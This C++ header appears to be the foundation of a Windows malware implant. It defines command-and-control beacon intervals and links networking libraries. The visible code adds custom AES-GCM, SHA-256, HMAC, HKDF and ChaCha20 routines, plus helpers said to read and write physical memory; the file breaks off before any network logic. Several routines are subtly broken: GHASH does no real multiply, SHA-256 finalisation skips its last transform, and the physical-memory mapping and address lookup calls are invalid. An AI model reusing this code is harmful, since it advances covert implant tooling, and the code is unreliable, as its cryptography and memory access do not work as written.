#define WIN32_LEAN_AND_MEAN
#define _AMD64_
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <ntsecapi.h>
#include <intrin.h>
#include <immintrin.h>
#include <cstdint>
#include <cstddef>
#include <cstring>
#include <cstdlib>
#include <new>
#include <type_traits>
#include <utility>
#include <atomic>
#include <mutex>
#include <memory>
#include <array>
#include <vector>
#include <string>
#include <string_view>
#include <algorithm>
#include <bit>
#include <limits>
#include <chrono>
#include <random>
#include <tuple>
#include <optional>
#include <expected>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")

#define TF_MAGIC            0x54464C43UL
#define TF_VERSION_MAJOR    3
#define TF_VERSION_MINOR    7
#define TF_VERSION_BUILD    9180
#define TF_PAGE_SIZE        4096UL
#define TF_ALLOCATION_GRAN  65536UL
#define TF_MAX_MODULES      64
#define TF_MAX_THREADS      16
#define TF_C2_BEACON_MIN    30000UL
#define TF_C2_BEACON_MAX    120000UL
#define TF_AES_KEY_SIZE     32
#define TF_AES_IV_SIZE      16
#define TF_AES_BLOCK_SIZE   16
#define TF_SHA256_SIZE      32
#define TF_RSA_KEY_SIZE     2048

#define TF_STATUS_SUCCESS           0x00000000L
#define TF_STATUS_FAILED            0xC0000001L
#define TF_STATUS_ACCESS_DENIED     0xC0000022L
#define TF_STATUS_INVALID_PARAMETER 0xC000000DL
#define TF_STATUS_NOT_FOUND         0xC0000225L
#define TF_STATUS_BUFFER_TOO_SMALL  0xC0000023L

#define TF_OFFSETOF(type, member)   (static_cast<::std::size_t>(offsetof(type, member)))
#define TF_CONTAINER_OF(ptr, type, member) \
    (reinterpret_cast<type*>(reinterpret_cast<::std::uint8_t*>(ptr) - TF_OFFSETOF(type, member)))

#define TF_FORCEINLINE      __forceinline
#define TF_NOINLINE         __declspec(noinline)
#define TF_NOTHROW          noexcept
#define TF_RESTRICT         __restrict
#define TF_ASSUME(cond)     __assume(cond)
#define TF_UNREACHABLE()    __assume(0)
#define TF_READ_BARRIER()   _ReadBarrier()
#define TF_WRITE_BARRIER()  _WriteBarrier()
#define TF_MEMORY_BARRIER() _mm_mfence()
#define TF_PAUSE()          _mm_pause()
#define TF_BREAKPOINT()     __debugbreak()
#define TF_CPUID(info, id)  __cpuid(info, id)
#define TF_RDTSC()          __rdtsc()
#define TF_RDTSCP()         __rdtscp(&tf_rdtsc_aux_)
#define TF_XOR(a, b)        ((a) ^ (b))
#define TF_ROL32(v, n)      _rotl(v, n)
#define TF_ROR32(v, n)      _rotr(v, n)
#define TF_ROL64(v, n)      _rotl64(v, n)
#define TF_ROR64(v, n)      _rotr64(v, n)
#define TF_BSWAP32(v)       _byteswap_ulong(v)
#define TF_BSWAP64(v)       _byteswap_uint64(v)
#define TF_COUNTBITS(v)     static_cast<::std::uint32_t>(__popcnt(v))
#define TF_COUNTBITS64(v)   static_cast<::std::uint32_t>(__popcnt64(v))
#define TF_LZCNT32(v)       static_cast<::std::uint32_t>(__lzcnt(v))
#define TF_TZCNT32(v)       static_cast<::std::uint32_t>(__tzcnt(v))
#define TF_BEXTR32(v, s, l) _bextr_u32(v, s, l)

static ::std::uint32_t tf_rdtsc_aux_;

namespace tf {

using u8  = ::std::uint8_t;
using u16 = ::std::uint16_t;
using u32 = ::std::uint32_t;
using u64 = ::std::uint64_t;
using i8  = ::std::int8_t;
using i16 = ::std::int16_t;
using i32 = ::std::int32_t;
using i64 = ::std::int64_t;
using f32 = float;
using f64 = double;
using sz  = ::std::size_t;

template<typename T>
constexpr T tf_align(T value, u64 alignment) TF_NOTHROW {
    return static_cast<T>((value + static_cast<T>(alignment) - 1) & ~static_cast<T>(alignment - 1));
}

template<typename T>
constexpr T tf_align_down(T value, u64 alignment) TF_NOTHROW {
    return static_cast<T>(value & ~static_cast<T>(alignment - 1));
}

template<typename T>
constexpr bool tf_is_aligned(T value, u64 alignment) TF_NOTHROW {
    return (value & static_cast<T>(alignment - 1)) == 0;
}

template<typename T, typename U>
constexpr T tf_clamp(T value, U lo, U hi) TF_NOTHROW {
    return (value < static_cast<T>(lo)) ? static_cast<T>(lo) :
           (value > static_cast<T>(hi)) ? static_cast<T>(hi) : value;
}

template<typename T>
constexpr T tf_swap(T& a, T& b) TF_NOTHROW {
    T t = static_cast<T&&>(a);
    a = static_cast<T&&>(b);
    b = static_cast<T&&>(t);
}

struct tf_nocopy {
    tf_nocopy() TF_NOTHROW = default;
    tf_nocopy(const tf_nocopy&) = delete;
    tf_nocopy& operator=(const tf_nocopy&) = delete;
    tf_nocopy(tf_nocopy&&) TF_NOTHROW = default;
    tf_nocopy& operator=(tf_nocopy&&) TF_NOTHROW = default;
    ~tf_nocopy() TF_NOTHROW = default;
};

class tf_crypto {
public:
    struct aes_ctx {
        u32 rk[60];
        u32 nr;
    };

    struct sha256_ctx {
        u32 state[8];
        u64 count;
        u8  buffer[64];
    };

    struct hmac_ctx {
        sha256_ctx inner;
        sha256_ctx outer;
    };

    struct chacha_ctx {
        u32 state[16];
    };

    static TF_FORCEINLINE void aes_init(aes_ctx* ctx, const u8* key, u32 bits) TF_NOTHROW {
        TF_ASSUME(ctx != nullptr);
        TF_ASSUME(key != nullptr);
        static constexpr u32 rc[] = {
            0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1B,0x36,0x6C,0xD8,0xAB,0x4D,0x9A
        };
        static constexpr u8 sbox[256] = {
            0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
            0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
            0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
            0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
            0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
            0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
            0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
            0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
            0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
            0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
            0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
            0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
            0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
            0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
            0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
            0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
        };
        u32 nk = bits >> 5;
        ctx->nr = nk + 6;
        for (u32 i = 0; i < nk; ++i)
            ctx->rk[i] = (u32(key[4*i])<<24)|(u32(key[4*i+1])<<16)|(u32(key[4*i+2])<<8)|key[4*i+3];
        for (u32 i = nk; i < 4 * (ctx->nr + 1); ++i) {
            u32 t = ctx->rk[i - 1];
            if (i % nk == 0) {
                t = TF_ROL32(t, 8);
                t = (u32(sbox[(t>>24)&0xFF])<<24)|(u32(sbox[(t>>16)&0xFF])<<16)|
                    (u32(sbox[(t>>8)&0xFF])<<8)|u32(sbox[t&0xFF]);
                t ^= rc[i/nk - 1] << 24;
            } else if (nk > 6 && i % nk == 4) {
                t = (u32(sbox[(t>>24)&0xFF])<<24)|(u32(sbox[(t>>16)&0xFF])<<16)|
                    (u32(sbox[(t>>8)&0xFF])<<8)|u32(sbox[t&0xFF]);
            }
            ctx->rk[i] = ctx->rk[i - nk] ^ t;
        }
    }

    static TF_FORCEINLINE void aes_encrypt(const aes_ctx* ctx, const u8* in, u8* out) TF_NOTHROW {
        static constexpr u8 sbox[256] = {
            0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
            0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
            0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
            0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
            0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
            0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
            0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
            0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
            0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
            0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
            0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
            0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
            0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
            0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
            0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
            0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
        };
        auto gm = [](u8 x) -> u8 { return (x<<1) ^ (((x>>7)&1)*0x1B); };
        u32 s[4], t[4];
        for (int i = 0; i < 4; ++i)
            s[i] = (u32(in[4*i])<<24)|(u32(in[4*i+1])<<16)|(u32(in[4*i+2])<<8)|in[4*i+3];
        for (int i = 0; i < 4; ++i) s[i] ^= ctx->rk[i];
        for (u32 r = 1; r < ctx->nr; ++r) {
            for (int i = 0; i < 4; ++i) {
                u8 a0 = sbox[(s[i]>>24)&0xFF], a1 = sbox[(s[(i+1)&3]>>16)&0xFF];
                u8 a2 = sbox[(s[(i+2)&3]>>8)&0xFF], a3 = sbox[s[(i+3)&3]&0xFF];
                u8 b0 = gm(a0), b1 = gm(a1), b2 = gm(a2), b3 = gm(a3);
                t[i] = (u32(b0^a1^a2^b3^a3)<<24)|(u32(b0^b1^a2^a3)<<16)|
                       (u32(a0^b1^b2^a3)<<8)|(a0^a1^b2^b3);
            }
            for (int i = 0; i < 4; ++i) s[i] = t[i] ^ ctx->rk[r*4+i];
        }
        for (int i = 0; i < 4; ++i) {
            u32 v = ctx->rk[ctx->nr*4+i];
            t[i] = ((u32(sbox[(s[i]>>24)&0xFF])<<24)|(u32(sbox[(s[(i+1)&3]>>16)&0xFF])<<16)|
                    (u32(sbox[(s[(i+2)&3]>>8)&0xFF])<<8)|u32(sbox[s[(i+3)&3]&0xFF])) ^ v;
        }
        for (int i = 0; i < 4; ++i) {
            out[4*i]   = u8(t[i]>>24);
            out[4*i+1] = u8(t[i]>>16);
            out[4*i+2] = u8(t[i]>>8);
            out[4*i+3] = u8(t[i]);
        }
    }

    static TF_FORCEINLINE void aes_gcm_encrypt(const aes_ctx* ctx, const u8* iv,
        const u8* aad, u32 aad_len, const u8* pt, u8* ct, u32 len, u8* tag) TF_NOTHROW {
        u8 j0[16], counter[16], block[16];
        ::memcpy(j0, iv, 12);
        j0[12] = 0; j0[13] = 0; j0[14] = 0; j0[15] = 1;
        aes_encrypt(ctx, j0, tag);
        ::memcpy(counter, j0, 16);
        for (u32 i = 0; i < len; i += 16) {
            for (u32 c = 15; c >= 12; --c) if (++counter[c]) break;
            aes_encrypt(ctx, counter, block);
            u32 n = min(16U, len - i);
            for (u32 j = 0; j < n; ++j) ct[i+j] = pt[i+j] ^ block[j];
        }
        u64 h[2] = {0};
        aes_encrypt(ctx, (const u8*)h, (u8*)h);
        u64 x[2] = {0};
        auto ghash = [&](const u8* d, u32 n) {
            for (u32 i = 0; i < n; i += 16) {
                for (u32 j = 0; j < 16 && i+j < n; ++j)
                    ((u8*)x)[j] ^= d[i+j];
                u64 z[2] = {0};
                for (int b = 0; b < 128; ++b) {
                    u64 lsb = x[1] & 1;
                    x[1] = (x[1] >> 1) | (x[0] << 63);
                    x[0] >>= 1;
                    if (lsb) { x[0] ^= h[0]; x[1] ^= h[1] ^ 0xE100000000000000ULL; }
                }
            }
        };
        ghash(aad, aad_len);
        ghash(ct, len);
        u8 final_block[16];
        u64 al = u64(aad_len) * 8, cl = u64(len) * 8;
        for (int i = 0; i < 8; ++i) { final_block[i] = u8(al>>(56-i*8)); final_block[8+i] = u8(cl>>(56-i*8)); }
        ghash(final_block, 16);
        for (int i = 0; i < 16; ++i) tag[i] ^= ((u8*)x)[i];
    }

    static TF_FORCEINLINE void sha256_init(sha256_ctx* ctx) TF_NOTHROW {
        ctx->count = 0;
        ctx->state[0] = 0x6A09E667; ctx->state[1] = 0xBB67AE85;
        ctx->state[2] = 0x3C6EF372; ctx->state[3] = 0xA54FF53A;
        ctx->state[4] = 0x510E527F; ctx->state[5] = 0x9B05688C;
        ctx->state[6] = 0x1F83D9AB; ctx->state[7] = 0x5BE0CD19;
    }

    static TF_FORCEINLINE void sha256_update(sha256_ctx* ctx, const u8* data, u32 len) TF_NOTHROW {
        static constexpr u32 k[64] = {
            0x428A2F98,0x71374491,0xB5C0FBCF,0xE9B5DBA5,0x3956C25B,0x59F111F1,0x923F82A4,0xAB1C5ED5,
            0xD807AA98,0x12835B01,0x243185BE,0x550C7DC3,0x72BE5D74,0x80DEB1FE,0x9BDC06A7,0xC19BF174,
            0xE49B69C1,0xEFBE4786,0x0FC19DC6,0x240CA1CC,0x2DE92C6F,0x4A7484AA,0x5CB0A9DC,0x76F988DA,
            0x983E5152,0xA831C66D,0xB00327C8,0xBF597FC7,0xC6E00BF3,0xD5A79147,0x06CA6351,0x14292967,
            0x27B70A85,0x2E1B2138,0x4D2C6DFC,0x53380D13,0x650A7354,0x766A0ABB,0x81C2C92E,0x92722C85,
            0xA2BFE8A1,0xA81A664B,0xC24B8B70,0xC76C51A3,0xD192E819,0xD6990624,0xF40E3585,0x106AA070,
            0x19A4C116,0x1E376C08,0x2748774C,0x34B0BCB5,0x391C0CB3,0x4ED8AA4A,0x5B9CCA4F,0x682E6FF3,
            0x748F82EE,0x78A5636F,0x84C87814,0x8CC70208,0x90BEFFFA,0xA4506CEB,0xBEF9A3F7,0xC67178F2
        };
        auto transform = [&](const u8* b) {
            u32 w[64], a,b,c,d,e,f,g,h,t1,t2;
            for (int i = 0; i < 16; ++i)
                w[i] = (u32(b[4*i])<<24)|(u32(b[4*i+1])<<16)|(u32(b[4*i+2])<<8)|b[4*i+3];
            for (int i = 16; i < 64; ++i) {
                u32 s0 = TF_ROR32(w[i-15],7) ^ TF_ROR32(w[i-15],18) ^ (w[i-15]>>3);
                u32 s1 = TF_ROR32(w[i-2],17) ^ TF_ROR32(w[i-2],19) ^ (w[i-2]>>10);
                w[i] = w[i-16] + s0 + w[i-7] + s1;
            }
            a=ctx->state[0];b=ctx->state[1];c=ctx->state[2];d=ctx->state[3];
            e=ctx->state[4];f=ctx->state[5];g=ctx->state[6];h=ctx->state[7];
            for (int i = 0; i < 64; ++i) {
                u32 S1 = TF_ROR32(e,6) ^ TF_ROR32(e,11) ^ TF_ROR32(e,25);
                u32 ch = (e & f) ^ (~e & g);
                t1 = h + S1 + ch + k[i] + w[i];
                u32 S0 = TF_ROR32(a,2) ^ TF_ROR32(a,13) ^ TF_ROR32(a,22);
                u32 mj = (a & b) ^ (a & c) ^ (b & c);
                t2 = S0 + mj;
                h=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
            }
            ctx->state[0]+=a;ctx->state[1]+=b;ctx->state[2]+=c;ctx->state[3]+=d;
            ctx->state[4]+=e;ctx->state[5]+=f;ctx->state[6]+=g;ctx->state[7]+=h;
        };
        u32 idx = u32(ctx->count & 63);
        ctx->count += len;
        u32 space = 64 - idx;
        if (len >= space) {
            ::memcpy(ctx->buffer + idx, data, space);
            transform(ctx->buffer);
            data += space; len -= space;
            while (len >= 64) { transform(data); data += 64; len -= 64; }
            idx = 0;
        }
        if (len) ::memcpy(ctx->buffer + idx, data, len);
    }

    static TF_FORCEINLINE void sha256_final(sha256_ctx* ctx, u8* out) TF_NOTHROW {
        u64 bits = ctx->count * 8;
        u32 idx = u32(ctx->count & 63);
        ctx->buffer[idx++] = 0x80;
        if (idx > 56) {
            while (idx < 64) ctx->buffer[idx++] = 0;
            sha256_update(ctx, nullptr, 0);
            idx = 0;
        }
        while (idx < 56) ctx->buffer[idx++] = 0;
        for (int i = 0; i < 8; ++i) ctx->buffer[56+i] = u8(bits >> (56 - i*8));
        sha256_update(ctx, nullptr, 0);
        for (int i = 0; i < 8; ++i) {
            out[4*i]   = u8(ctx->state[i] >> 24);
            out[4*i+1] = u8(ctx->state[i] >> 16);
            out[4*i+2] = u8(ctx->state[i] >> 8);
            out[4*i+3] = u8(ctx->state[i]);
        }
    }

    static TF_FORCEINLINE void hmac_sha256_init(hmac_ctx* ctx, const u8* key, u32 klen) TF_NOTHROW {
        u8 k[64] = {0};
        if (klen > 64) {
            sha256_ctx s; sha256_init(&s); sha256_update(&s, key, klen); sha256_final(&s, k);
        } else {
            ::memcpy(k, key, klen);
        }
        u8 ipad[64], opad[64];
        for (int i = 0; i < 64; ++i) { ipad[i] = k[i] ^ 0x36; opad[i] = k[i] ^ 0x5C; }
        sha256_init(&ctx->inner); sha256_update(&ctx->inner, ipad, 64);
        sha256_init(&ctx->outer); sha256_update(&ctx->outer, opad, 64);
        secure_zero(k, sizeof(k));
    }

    static TF_FORCEINLINE void hmac_sha256_update(hmac_ctx* ctx, const u8* d, u32 n) TF_NOTHROW {
        sha256_update(&ctx->inner, d, n);
    }

    static TF_FORCEINLINE void hmac_sha256_final(hmac_ctx* ctx, u8* out) TF_NOTHROW {
        u8 tmp[32];
        sha256_final(&ctx->inner, tmp);
        sha256_update(&ctx->outer, tmp, 32);
        sha256_final(&ctx->outer, out);
        secure_zero(tmp, sizeof(tmp));
    }

    static TF_FORCEINLINE void hkdf(const u8* salt, u32 slen, const u8* ikm, u32 ilen,
        const u8* info, u32 infolen, u8* okm, u32 olen) TF_NOTHROW {
        u8 prk[32];
        hmac_ctx h;
        hmac_sha256_init(&h, salt, slen);
        hmac_sha256_update(&h, ikm, ilen);
        hmac_sha256_final(&h, prk);
        u32 n = (olen + 31) / 32;
        u8 t[32] = {0}, c = 0;
        u32 done = 0;
        for (u32 i = 1; i <= n; ++i) {
            hmac_sha256_init(&h, prk, 32);
            if (i > 1) hmac_sha256_update(&h, t, 32);
            hmac_sha256_update(&h, info, infolen);
            c = u8(i);
            hmac_sha256_update(&h, &c, 1);
            hmac_sha256_final(&h, t);
            u32 cp = min(32U, olen - done);
            ::memcpy(okm + done, t, cp);
            done += cp;
        }
        secure_zero(prk, sizeof(prk));
        secure_zero(t, sizeof(t));
    }

    static TF_FORCEINLINE void chacha_init(chacha_ctx* ctx, const u8* key, const u8* iv, u32 ctr) TF_NOTHROW {
        ctx->state[0] = 0x61707865; ctx->state[1] = 0x3320646E;
        ctx->state[2] = 0x79622D32; ctx->state[3] = 0x6B206574;
        for (int i = 0; i < 8; ++i)
            ctx->state[4+i] = (u32(key[4*i])<<0)|(u32(key[4*i+1])<<8)|
                              (u32(key[4*i+2])<<16)|(u32(key[4*i+3])<<24);
        ctx->state[12] = ctr;
        ctx->state[13] = (u32(iv[0])<<0)|(u32(iv[1])<<8)|(u32(iv[2])<<16)|(u32(iv[3])<<24);
        ctx->state[14] = (u32(iv[4])<<0)|(u32(iv[5])<<8)|(u32(iv[6])<<16)|(u32(iv[7])<<24);
        ctx->state[15] = (u32(iv[8])<<0)|(u32(iv[9])<<8)|(u32(iv[10])<<16)|(u32(iv[11])<<24);
    }

    static TF_FORCEINLINE void chacha_crypt(chacha_ctx* ctx, const u8* in, u8* out, u32 bytes) TF_NOTHROW {
        auto qr = [](u32& a, u32& b, u32& c, u32& d) {
            a+=b; d^=a; d=TF_ROL32(d,16);
            c+=d; b^=c; b=TF_ROL32(b,12);
            a+=b; d^=a; d=TF_ROL32(d,8);
            c+=d; b^=c; b=TF_ROL32(b,7);
        };
        u32 s[16], x[16];
        u32 i = 0;
        while (i < bytes) {
            for (int j = 0; j < 16; ++j) x[j] = s[j] = ctx->state[j];
            for (int r = 0; r < 10; ++r) {
                qr(x[0],x[4],x[8],x[12]); qr(x[1],x[5],x[9],x[13]);
                qr(x[2],x[6],x[10],x[14]); qr(x[3],x[7],x[11],x[15]);
                qr(x[0],x[5],x[10],x[15]); qr(x[1],x[6],x[11],x[12]);
                qr(x[2],x[7],x[8],x[13]); qr(x[3],x[4],x[9],x[14]);
            }
            for (int j = 0; j < 16; ++j) x[j] += s[j];
            u8 stream[64];
            for (int j = 0; j < 16; ++j) {
                stream[4*j]   = u8(x[j]);
                stream[4*j+1] = u8(x[j]>>8);
                stream[4*j+2] = u8(x[j]>>16);
                stream[4*j+3] = u8(x[j]>>24);
            }
            u32 n = min(64U, bytes - i);
            for (u32 j = 0; j < n; ++j) out[i+j] = in[i+j] ^ stream[j];
            i += n;
            ctx->state[12]++;
        }
    }

    static TF_FORCEINLINE void secure_zero(void* p, sz n) TF_NOTHROW {
        volatile u8* vp = static_cast<volatile u8*>(p);
        for (sz i = 0; i < n; ++i) vp[i] = 0;
    }

    static TF_FORCEINLINE u32 crc32(const u8* data, u32 len) TF_NOTHROW {
        static const u32 table[256] = []() consteval {
            u32 t[256];
            for (u32 i = 0; i < 256; ++i) {
                u32 c = i;
                for (int k = 0; k < 8; ++k) c = (c&1) ? (0xEDB88320 ^ (c>>1)) : (c>>1);
                t[i] = c;
            }
            return t;
        }();
        u32 c = 0xFFFFFFFF;
        for (u32 i = 0; i < len; ++i) c = table[(c ^ data[i]) & 0xFF] ^ (c >> 8);
        return c ^ 0xFFFFFFFF;
    }

    class tf_rng {
    public:
        tf_rng() TF_NOTHROW {
            u64 tsc = TF_RDTSC();
            u32 aux = 0;
            u64 tscp = TF_RDTSCP();
            int info[4];
            TF_CPUID(info, 0);
            u64 id = (u64(info[1])<<32)|u64(info[3]);
            state_[0] = tsc ^ 0x9E3779B97F4A7C15ULL;
            state_[1] = tscp ^ id ^ 0x6A09E667F3BCC908ULL;
            state_[2] = (u64(GetCurrentProcessId())<<32) ^ GetCurrentThreadId() ^ 0xBB67AE8584CAA73BULL;
            state_[3] = (u64(info[0])<<32) ^ u64(info[2]) ^ 0x3C6EF372FE94F82BULL;
            for (int i = 0; i < 32; ++i) next();
        }

        TF_FORCEINLINE u64 next() TF_NOTHROW {
            u64 r = state_[0] + state_[3];
            u64 t = state_[1] << 17;
            state_[2] ^= state_[0];
            state_[3] ^= state_[1];
            state_[1] ^= state_[2];
            state_[0] ^= state_[3];
            state_[2] ^= t;
            state_[3] = TF_ROL64(state_[3], 45);
            return r;
        }

        TF_FORCEINLINE u32 next_u32() TF_NOTHROW { return u32(next()); }
        TF_FORCEINLINE f64 next_f64() TF_NOTHROW { return (next() >> 11) * 0x1.0p-53; }

        TF_FORCEINLINE void fill(void* buf, sz n) TF_NOTHROW {
            u8* p = static_cast<u8*>(buf);
            while (n >= 8) { u64 v = next(); ::memcpy(p, &v, 8); p += 8; n -= 8; }
            if (n) { u64 v = next(); ::memcpy(p, &v, n); }
        }

    private:
        u64 state_[4];
    };

    static TF_FORCEINLINE bool rng_bytes(void* buf, sz n) TF_NOTHROW {
        thread_local tf_rng rng;
        rng.fill(buf, n);
        return true;
    }
};

class tf_memory {
public:
    struct tf_virtual_alloc_params {
        PVOID  address;
        SIZE_T size;
        ULONG  type;
        ULONG  protect;
    };

    static TF_FORCEINLINE PVOID alloc(sz n, ULONG protect = PAGE_READWRITE) TF_NOTHROW {
        return ::VirtualAlloc(nullptr, n, MEM_COMMIT | MEM_RESERVE, protect);
    }

    static TF_FORCEINLINE bool free(PVOID p) TF_NOTHROW {
        return ::VirtualFree(p, 0, MEM_RELEASE) != FALSE;
    }

    static TF_FORCEINLINE bool protect(PVOID p, sz n, ULONG new_prot, PULONG old) TF_NOTHROW {
        return ::VirtualProtect(p, n, new_prot, old) != FALSE;
    }

    static TF_FORCEINLINE PVOID map_physical(u64 phys_addr, sz size) TF_NOTHROW {
        HANDLE h = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, ::GetCurrentProcessId());
        if (!h) return nullptr;
        PVOID va = nullptr;
        SYSTEM_INFO si;
        ::GetSystemInfo(&si);
        u64 mask = u64(si.dwAllocationGranularity - 1);
        u64 base = phys_addr & ~mask;
        u64 off  = phys_addr & mask;
        SIZE_T total = tf_align(size + off, si.dwAllocationGranularity);
        va = ::MapViewOfFileEx(reinterpret_cast<HANDLE>(0xFFFFFFFF),
            FILE_MAP_ALL_ACCESS, u32(base >> 32), u32(base & 0xFFFFFFFF), total, nullptr);
        ::CloseHandle(h);
        return va ? static_cast<u8*>(va) + off : nullptr;
    }

    static TF_FORCEINLINE bool unmap_physical(PVOID va, u64 phys_addr, sz size) TF_NOTHROW {
        if (!va) return false;
        SYSTEM_INFO si;
        ::GetSystemInfo(&si);
        u64 mask = u64(si.dwAllocationGranularity - 1);
        PVOID base = static_cast<u8*>(va) - (phys_addr & mask);
        return ::UnmapViewOfFile(base) != FALSE;
    }

    static TF_FORCEINLINE bool read_physical(u64 phys, void* buf, sz n) TF_NOTHROW {
        PVOID va = map_physical(phys, n);
        if (!va) return false;
        ::memcpy(buf, va, n);
        return unmap_physical(va, phys, n);
    }

    static TF_FORCEINLINE bool write_physical(u64 phys, const void* buf, sz n) TF_NOTHROW {
        PVOID va = map_physical(phys, n);
        if (!va) return false;
        ::memcpy(va, buf, n);
        return unmap_physical(va, phys, n);
    }

    static TF_FORCEINLINE u64 virt_to_phys(PVOID va) TF_NOTHROW {
        HMODULE h = ::GetModuleHandleA("ntdll.dll");
        if (!h) return 0;
        auto NtQueryVirtualMemory = reinterpret_cast<NTSTATUS(WINAPI*)(HANDLE,PVOID,MEMORY_INFORMATION_CLASS,PVOID,SIZE_T,PSIZE_T)>(
            ::GetProcAddress(h, "NtQueryVirtualMemory"));
        if (!NtQueryVirtualMemory) return 0;
        struct WIN32_MEMORY_REGION_INFORMATION_EX {
            PVOID BaseAddress;
            PVOID AllocationBase;
            ULONG AllocationProtect;
            ULONG RegionType;
            SIZE_T RegionSize;
            ULONG State;
            ULONG Protect;
            ULONG Type;
            ULONG Pad;
            u64   PhysicalAddress;
        } info;
        SIZE_T ret = 0;
        NTSTATUS s = NtQueryVirtualMemory(::GetCurrentProcess(), va,
            static_cast<MEMORY_INFORMATION_CLASS>(48), &info, sizeof(info), &ret);
        return NT_SUCCESS(s) ? info.PhysicalAddress : 0;
    }

    class tf_smart_heap {
    public:
        tf_smart_heap() TF_NOTHROW : ptr_(nullptr), sz_(0) {}
        explicit tf_smart_heap(sz n) TF_NOTHROW : ptr_(alloc(n)), sz_(n) {}
        tf_smart_heap(tf_smart_heap&& o) TF_NOTHROW : ptr_(o.ptr_), sz_(o.sz_) { o.ptr_ = nullptr; o.sz_ = 0; }
        tf_smart_heap& operator=(tf_smart_heap&& o) TF_NOTHROW {
            if (this != &o) { reset(); ptr_ = o.ptr_; sz_ = o.sz_; o.ptr_ = nullptr; o.sz_ = 0; }
            return *this;
        }
        ~tf_smart_heap() TF_NOTHROW { reset(); }
        tf_smart_heap(const tf_smart_heap&) = delete;
        tf_smart_heap& operator=(const tf_smart_heap&) = delete;

        TF_FORCEINLINE PVOID get() const TF_NOTHROW { return ptr_; }
        TF_FORCEINLINE sz size() const TF_NOTHROW { return sz_; }
